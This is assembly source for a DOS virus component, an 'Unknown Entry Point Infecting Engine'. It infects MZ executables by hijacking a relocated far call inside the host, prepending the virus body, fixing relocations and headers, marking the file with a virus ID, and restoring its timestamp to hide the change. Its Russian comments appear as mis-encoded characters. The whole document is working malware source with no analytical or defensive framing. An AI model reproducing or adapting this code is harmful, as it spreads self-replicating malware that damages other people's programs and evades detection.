   ;          Unknown Entry Point Infecting Engine
   ;          ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;                 Version 2.0

   MZ_sign     equ 0
   PartPage    equ 2
   PageCnt     equ 4
   RelocCnt    equ 6
   HdrSize     equ 8
   StackPointer    equ 0Eh
   ChekSum     equ 12h
   EntryCS     equ 16h
   TablOffs    equ 18h

   LenPath     equ 80h

   ;*¥ ãáâ  ¢«¨¢ ¥â ¨¤¥â¨ä¨ª â®à § à ¦¥®áâ¨
   ;eax -   ¢ëå®¤¥ ¨áå®¤®¥ „ â /‚à¥¬ï

   ;‚¨¬ ¨¥:
   ;      Š®àà¥ªâ¨à®¢ª  Reloc í«¥¬¥â®¢ ¢ § £®«®¢ª¥ ¨ ¢ â¥«¥ ¯à®£à ¬¬ë
   ;      ®á®¢     ¯à¥¤¯®«®¦¥¨¨ çâ®  ¤à¥á  Reloc *«¥¬¥â®¢
   ;      ¢ Header'e «¨¥©® ¢®§à áâ îâ.…á«¨ íâ® ãá«®¢¨¥ ¥ ¢ë¯®«ï¥âáï
   ;      ä ©« ¡ã¤¥â áª®àà¥ªâ¨à®¢  ¥¯à ¢¨«ì® ¨ ¡ã¤¥â ¥à ¡®â®á¯®á®¡ë¬

   UEPinfect   proc    near
   ;DS = CS
   ;DS - Virus DATA

           mov bx,[handle]
           mov ah,3Fh
           mov cx,1Ah
           mov dx,offset Header
           call    DOS

           cmp word ptr [Header+MZ_sign],'ZM'  ;*¥ EXE'è¨ª
           jne ExitUEPInfect

           cmp word ptr [Header+RelocCnt],0 ;*¥â Reloc í«¥¬¥â®¢ -
           je  ExitUEPInfect            ;¥â ¤ «ì¨å ¢ë§®¢®¢

           call    GetFPB        ;ES:DI - File Parameter Block
                         ;*ã¤¥¬ à ¡®â âì á ä ©«®¬   ãà®¢¥ FPB

           mov word ptr fs:[di+2],2   ;*¥¦¨¬ ®âªàëâ¨ï - Read/Write

           mov eax,fs:[di+0Dh]   ;eax - ‚à¥¬ï/„ â 
           mov dword ptr [TimeDate],eax
           mov edx,fs:[di+11h]   ;edx - RealLen
           mov dword ptr [RealLen],edx

           mov ax,word ptr [Header+PageCnt]
           cwde
           shl eax,9     ;*¥ «ì ï ¤«¨  ¡®«ìè¥ § £àã¦ ¥¬®©
           cmp eax,edx
           jc  ExitUEPInfect     ;‘ªàëâë© Overlay

           mov word ptr [ProgID],'ZM'

   ;®âì¥¤¥¬    ç «® ª®¤®¢®£® á¥£¬¥â 
           mov ax,word ptr [Header+EntryCS]
           movzx   eax,ax
           shl eax,4
           call    BeginData     ;* ç «® Code Seg ¢ ä ©«¥
           add eax,edx

           mov dword ptr [CodeEntry],eax

           mov fs:[di+15h],eax     ;Žâì¥¤¥¬   Code Seg

           mov ax,word ptr [Header+EntryCS] ;FileCS
           mov bx,word ptr [Header+StackPointer]
           sub bx,ax

           add bx,word ptr [Header+HdrSize]   ;Œ¥áâ® ¤«ï Header'a
                                  ;+ THA
           mov ax,1000h
           cmp ax,bx
           jnc @temp4
           mov bx,ax  ;BX - áª®«ìª® ¯ à £à ä®¢ ã¦® áç¨â âì ¨§ ä ©« 
   @temp4:                ;*¥ ¡®«ìè¥ 64Š¡

   ;‚ë¤¥«¨¬ ¯ ¬ïâì - ¯à¥¤¯®« £ ¥âáï çâ® ¥¥ ¤®áâ â®ç® < 64Š¡
           mov ah,48h
           call    DOS
           jc  ExitUEPinfect

           mov es,ax
   ;—¨â ¥¬ ª®¤®¢ë© á¥£¬¥â ¨§ ä ©« 
           mov cx,bx
           sub cx,word ptr [Header+HdrSize]
           shl cx,4    ;¢ ¡ ©â å
           push    ds

           push    es  ;DS -   ¢ë¤¥«¥ë© ¡«®ª
           pop ds

           mov bx,cs:[handle]
           mov ah,3Fh
           xor dx,dx
           call    DOS
           pop ds
           mov [LenCode],ax

           mov dx,ax
           and ax,0Fh
           pushf
           shr dx,4
           popf
           jz  @temp7
           inc dx
   @temp7:
           mov word ptr [ParaLenCode],dx
   ;‘¥£¬¥â GS - ¤«ï ¡ §¨à®¢ ¨ï THA
           mov ax,es
           add ax,dx
           mov gs,ax      ;* §  ¤«ï Header'a


   ;ˆé¥¬ â®çªã ¢å®¤  ¤«ï ¢¨àãá 
           mov cx,5       ;ˆáª âì ¥ ¡®«¥¥ 5¨ ¯à®æ¥¤ãà
           mov word ptr [StartCode],0
   FindUEP:
           push    cx
           call    SearchProc   ;ˆé¥¬ ¤ «ìîî ¯à®æ¥¤ãàã
           pop cx
           jc  FreeBlok     ;’®«ìª® ¯ ¬ïâì §àï § ¯®£ ¨«¨...:-E
           push    cx
           call    SearchXref   ;ˆé¥¬   ¥¥ à¥«®ª¥©è
           pop cx
           jnc UEPisFound
           loop    FindUEP
           stc
           jmp FreeBlok
   UEPisFound:
           mov eax,es:[di]  ;ES:DI -  ¤à¥á CALL FAR ¢ CodeSeg
           mov [OldReloc],eax   ;‘®åà ï¥¬  áâ®ïé¨©  ¤à¥á

           xor di,di          ;‘ä®à¬¨àã¥¬ ¯ãâì ¤«ï á®§¤ ¨ï TmpFile
           call    FormTmpPath

           xor cx,cx
           mov ah,3Ch        ;‘®§¤ ¥¬ TempFile
           call    DOS
           push    cs
           pop ds
           jc  FreeBlok
           mov [TempHandle],ax

           mov bx,ax        ;Œ¥áâ® ¤«ï ‘ª®àà¥ªâ¨à®¢ ®£® Header'a
           call    GetFPB
           call    BeginData
           mov fs:[di+15h],edx

           mov bx,[handle]
           call    GetFPB
           xor eax,eax
           mov fs:[di+15h],eax   ;Žâì¥¤¥¬    ç «® ¢ ä ©«¥

   ;—¨â ¥¬ § £®«®¢®ª
           push    ds
           push    gs
           pop ds

           call    BeginData   ;—¨â ¥¬ ã¦¥ á  ç «  (á¬. ¢ëè¥)
           mov cx,dx
           xor dx,dx
           mov ah,3Fh
           call    DOS
           pop ds

   ;       call    MakeMorphVirusCopy  ;‡ ¯®«ï¥â [LenDecryptor]
   ;       ‡¤¥áì ¢ë§®¢ ª ª®£® «¨¡® Mutation Engine
   ;       „«¨  * áè¨äà®¢é¨ª  ¤®«¦  ¡ëâì ¯®¬¥é¥  ¢ [LenDecryptor]

   ;„«¨  ¢¨àãá 

           mov ax,VirLen
           add ax,[LenDecryptor]
           mov dx,ax
           neg dl
           and dx,0Fh
           add ax,dx    ;AX - ¤«¨  ¢¨àãá  ¢ëà ¢¥ ï ¤® ¯ à £à ä 

           mov cx,ax

           shr ax,4
           add word ptr [OldReloc+2],ax
           mov bp,ax

   ;*¨è¥¬ ¢¨àãá á DS:VirPlace
           mov ah,40h
           mov bx,[TempHandle]
           mov dx,offset VirPlace
           call    DOS

   ;*¥à¥ª®¯¨àã¥¬ ä ©« ¢ Temp ” ©« ¯®¯ãâ® ª®àà¥ªâ¨àãï

           mov si,word ptr gs:[TablOffs]
           mov cx,word ptr gs:[RelocCnt]

           call    ReadPortion
   CopyFile:
           lfs bx,dword ptr gs:[si]
           call    TestLimit

           mov dx,es
           mov [AddSeg],fs
           add dx,[AddSeg]   ;add fs,es
           mov fs,dx

           add fs:[bx],bp  ;* áâà®©ª  *«¥¬¥â  ¯à®£à ¬¬ë
           add gs:[si+2],bp    ;* áâà®©ª  *«¥¬¥â  THA

           add si,4
           dec cx
           jne CopyFile
   ;* áâà ¨¢ ¥¬ë¥ í«¥¬¥âë ª®ç¨«¨áì
   NextCopy:
           call    WritePortion
           call    ReadPortion  ;ZF=1 - Š®¥æ ” ©« 
           jnz NextCopy

   ;*   ç «®
           mov bx,[TempHandle]
           call    GetFPB
           xor edx,edx
           mov fs:[di+15h],edx

   ;‘ª®àà¥ªâ¨àã¥¬ €¤à¥á â®çª¨ ¢å®¤  ¨ ‘â¥ª 

           add gs:[StackPointer],bp
           add gs:[EntryCS],bp

   ;‘ª®àà¥ªâ¨àã¥¬ ¤«¨ã ¢ § £®«®¢ª¥

           mov dx,bp
           shl edx,4
           add edx,12345678h
   RealLen     equ $-4

           mov ax,dx
           and ax,1FFh        ;*®¢ ï ¤«¨  ¢ § £®«®¢ª¥
           mov word ptr gs:[PartPage],ax
           pushf
           shr edx,9
           popf
           jz  @temp
           inc dx
   @temp:
           mov word ptr gs:[PageCnt],dx

           ;ˆ¤¥â¨ä¨ª â®à ¢¨àãá 
           mov word ptr gs:[ChekSum],VrID

   ;*¨è¥¬ Header ¢ Temp File
           call    BeginData
           mov cx,dx
           xor dx,dx
           mov ah,40h
           push    ds
           push    gs
           pop ds
           call    DOS
           pop ds

   ;®âì¥¤¥¬   CALL FAR ¢ áª®àà¥ªâ¨à®¢ ®¬ ä ©«¥
           mov edx,12345678h
   CodeEntry   equ $-4

           movzx   ebp,bp
           shl ebp,4
           add edx,ebp

           mov ax,[OffsFarCall]
           movzx   eax,ax
           add edx,eax
   ;Žâì¥¤¥¬
           mov fs:[di+15h],edx

   ;’®çª  ¢å®¤ 
           xor ax,ax
           push    ax
           mov ax,VirEntryPoint
           push    ax

   ;*¨è¥¬  èã â®çªã ¢å®¤  á® áâ¥ª 
           mov dx,sp
           push    ds
           push    ss
           pop ds
           mov cx,4
           mov ah,40h
           call    DOS
           pop ds
           add sp,4

           mov ah,3Eh       ;‡ ªà®¥¬ Temp ” ©«
           call    DOS
   ;‡ ªà®¥¬ ä ©«
           mov bx,[handle]
           mov ah,3Eh
           call    DOS

   ;“¨çâ®¦¨¬ ä ©«
           mov dx,offset Path
           mov ah,41h
           call    DOS

   ;*¥à¥¨¬¥ã¥¬ Temp ä ©« ¢ § à ¦ ¥¬ë© ä ©«
           push    ds     ÄÄÄÄÄÄÄÄÄÄÄ¿
           push    es        ³
                         ³
           xor di,di         ³
           call    FormTmpPath   ³
                         ³
           push    cs         ;DS:DX - *ãâì Temp ä ©« 
           pop es        ³
           mov di,offset Path    ³
           mov ah,56h        ³
           call    DOS       ³
                         ³
           pop es        ³
           pop ds    ÄÄÄÄÄÄÄÄÄÄÄÄÙ

   ;Žâªà®¥¬ § ®¢® *®¢ë© ä ©« ¤«ï ¯®á«¥¤ãîé¨å ¤¥©áâ¢¨©
           mov ah,3Dh
           mov dx,offset Path
           call    DOS

           mov [handle],ax  ;fs:di - File Parameter Blok
           mov bx,ax        ;§ ®¢® ®âªàëâ®£® ä ©« 
           call    GetFPB

   ;‚®ááâ ®¢¨¬ ‚à¥¬ï/„ âã
           mov eax,12345678h
   TimeDate    equ $-4
           clc

   FreeBlok:   push    eax
           pushf
           mov ah,49h       ;Žá¢®¡®¤¨¬ ¯ ¬ïâì
           call    DOS
           popf
           pop eax
           ret
   ExitUEPInfect:  stc
           ret
   UEPinfect   endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   SearchProc  proc    near
   ;*®¨áª áâ ¤ àâ®© ¤ «ì¥© ¯à®æ¥¤ãàë ¢ ¯¥à¢ëå 64Š¡ ª®¤ 
   ;
   ;  ’¨¯ :    push    bp   ˆ‹ˆ      enter immN,immM
   ;       mov bp,sp           .
   ;        .              .
   ;        .              .
   ;        .              .
   ;       pop bp        leave
   ;       retf [imm8]       retf  imm8
   ;
   ;ES - Scanned programm code
   ;DS - Virus Data

           mov dx,0FFFFh   ;ID çâ® ¯à®æ¥¤ãà  ¥  ©¤¥ 
           mov cx,[LenCode]
           mov [EnterProc],dx
           mov di,[StartCode]
   Scan:
           mov al,es:[di]
           cmp al,55h      ;push BP
           je  pushBP
           cmp al,0C8h     ;enter immN,immM
           je  EnterPRC
           cmp al,5Dh      ;pop BP
           je  exitPRC
           cmp al,0C9h     ;leave
           je  exitPRC
   NextScan:
           inc di
           dec cx
           jne Scan
           stc
           retn
   pushBP:
           mov ax,es:[di+1]

           cmp ax,0EC8Bh   ;mov bp,sp
           je  EnterPRC
           cmp ax,0E589h
           jne NextScan
   EnterPRC:
           mov [EnterProc],di
           jmp NextScan
   exitPRC:
           cmp [EnterProc],dx
           je  NextScan
           mov al,es:[di+1]
           cmp al,0CBh     ;retf
           je  OK
           cmp al,0CAh     ;retf imm8
           je  OK
           mov [EnterProc],dx
           jmp NextScan
   OK:     inc di      ;„«ï ¯®¨áª  á«¥¤ãîé¥©
           mov [StartCode],di
           clc
           ret
   SearchProc  endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   SearchXRef  proc    near
   ;ˆé¥â *¥«®ª¥©è    ©¤¥ãî ¤ «ìîî ¯à®æ¥¤ãàã ¢ ¯¥à¢ëå 64Š¡ ª®¤ 
   ;ES - Scanned programm code
   ;DS - Virus Data

           xor di,di
           mov cx,[LenCode]
           mov ax,word ptr [Header+EntryCS]
           mov dx,[EnterProc]
           mov word ptr [OffsetPRC],dx
           mov word ptr [OffsetPRC+2],ax
   Search:
           cmp byte ptr es:[di],9Ah
           jne NextSearch
   TestXref:
           cmp dword ptr es:[di+1],12345678h
   OffsetPRC   equ $-4
           je  FoundFarCall        ;‘«¥¤ãîé¨© ‘¥£¬¥âë©  ¤à¥á
           inc word ptr [OffsetPRC+2]
           sub word ptr [OffsetPRC],10h
           jnc TestXref

           mov word ptr [OffsetPRC],dx
           mov word ptr [OffsetPRC+2],ax
   NextSearch:
           inc di
           dec cx
           jne Search
           stc
           ret
   FoundFarCall:   inc di
           mov [OffsFarCall],di   ; DI -  ¤à¥á ®¯¥à ¤  ¢ CALL FAR
           clc
           ret
   SearchXRef  endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   BeginData   proc
   ;EDX - * ç «® ¤ ëå ¢ ä ©«¥
           mov dx,word ptr cs:[Header+HdrSize]
           movzx   edx,dx
           shl dx,4
           ret
   BeginData   endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   GetFPB      proc
   ;‚®§¢à é ¥â ¢ FS:DI  ¤à¥á File Parameter Block
   ;BX - Handle
           push    bx
           push    ax
           push    es
           mov ax,1220h    ;*®¬¥à ¢å®¤  ¢ SFT
           int 2Fh     ;ES:[di]

           mov bl,es:[di]  ;*®«ãç¨¬ ¡«®ª ®¯¨á ¨ï ä ©« 
           mov ax,1216h    ;es:di
           int 2Fh

           push    es
           pop fs

           pop es
           pop ax
           pop bx
           ret
   GetFPB      endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   FormTmpPath proc
   ;‘ä®à¬¨à®¢ âì ¯ãâì ª Temp ä ©«ã
   ;*  ¢å®¤¥ - ªã¤  : ES:DI
   ;*  ¢ëå®¤¥ - £¤¥ : DS:DX

           push    cs
           pop ds

           mov si,offset Path
           push    si  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
           mov word ptr [EndDir],si       ³
           mov ax,si              ³
           inc ax             ³
   @temp5:                        ³
           cmp byte ptr [si],'\'      ³
           jne $+5            ³
           mov word ptr [EndDir],ax       ³
                              ³
           cmp byte ptr [si],'/'      ³
           jne $+5            ³
           mov word ptr [EndDir],ax       ³
                              ³
           cmp byte ptr [si],0        ³
           je  CopyDir            ³
           inc si             ³
           inc ax             ³
           jmp @temp5             ³
   CopyDir:                       ³
           pop si   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

           push    di      ÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
           mov dx,offset Path ;Š®¥æ ¯ãâ¨,¯®á«¥ ¯à¨áâëªã¥¬ ä ©«
   EndDir      equ $-2          ³
           cmp si,dx            ³
           je  CopyName         ³
   @temp2:                      ³
           lodsb                ³
           stosb                ³
           cmp si,dx            ³
           jne @temp2           ³
   CopyName:                    ³
           mov si,offset UEPTempFile    ³
           mov cx,LenUEPfile        ³
           cld            ;*à¨áâëªã¥¬ ¨¬ï ä ©« 
           rep movsb            ³
                            ³
           pop dx     ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
           push    es
           pop ds
           ret
   FormTmpPath endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   TestLimit   proc
   ;*à®¢¥àï¥â ¢ëè¥« «¨ Reloc §  ¯à¥¤¥« LenCode
           push    cx

           mov dx,bx
           and bx,0Fh
           shr dx,4
           mov [AddSeg],fs ;add fs,dx
           add dx,[AddSeg]
           mov fs,dx

           mov cx,1
   Subtract    equ $-2
                         ÄÄÄÄÄÄÄÄÄÄÄÄ¿
   Repeat:     mov [AddSeg],fs       ³
           sub [AddSeg],1234h       ;sub fs,ParaLenCode
   ParaLenCode equ $-2           ³
           jc  Restore           ³
           mov fs,[AddSeg]       ³
                             ³
           loop    Repeat        ÄÄÄÄÄÄÄÄÄÄÄÄÙ

           call    WritePortion
           call    ReadPortion

           inc word ptr [Subtract]
           mov cx,1
           jmp Repeat

   Restore:    pop cx
           ret
   TestLimit   endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ReadPortion proc

           push    cx
           push    bx
           push    ax

           mov ah,3Fh
           mov bx,[Handle]
           mov cx,[LenCode]
           xor dx,dx
           push    ds
           push    es
           pop ds
           call    DOS
           pop ds
           mov word ptr [WrLen],ax
           cmp ax,0
           pop ax
           pop bx
           pop cx
           ret
   ReadPortion endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   WritePortion    proc

           push    cx
           push    bx
           push    ax

           mov ah,40h
           mov bx,[TempHandle]
           mov cx,0000h
   WrLen       equ $-2
           xor dx,dx
           push    ds
           push    es
           pop ds
           call    DOS
           pop ds

           pop ax
           pop bx
           pop cx
           ret
   WritePortion    endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ UEP Engine DATA ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   UEPTempFile db  'uepfile.tmp',0
   LenUEPfile  equ $-UEPTempFile
   StartCode   dw  0
   LenCode     dw  0
   EnterProc   dw  0
   OffsFarCall dw  0
   TempHandle  dw  0
   ProgID      dw  'MZ'
   AddSeg      dw  0
   OldReloc    dd  0
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
